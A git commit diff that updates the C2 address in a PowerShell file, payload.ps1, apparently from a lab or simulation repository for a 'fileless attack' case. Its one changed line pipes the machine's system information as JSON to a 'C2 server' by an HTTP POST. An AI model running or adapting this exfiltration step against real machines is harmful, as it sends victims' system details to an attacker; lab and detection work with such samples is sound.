7d503efe09ae980a4492599c133450518f97e69f
Oren Maoz Sharabi <108679419+SilentProcess87@users.noreply.github.com>
2024-07-05 01:39:34 +0300

    Update payload.ps1

--- Case 1 - Fileless Attack/payload.ps1
+++ Case 1 - Fileless Attack/payload.ps1
@@ -4,4 +4,4 @@
 $sysInfo = Get-ComputerInfo
 
 # Send the collected information to the C2 server
-$sysInfo | ConvertTo-Json | Invoke-WebRequest -Uri "http://172.16.1.155:8080/collect" -Method POST -ContentType "application/json"
+$sysInfo | ConvertTo-Json | Invoke-WebRequest -Uri "http://10.100.102.60:8080/collect" -Method POST -ContentType "application/json"
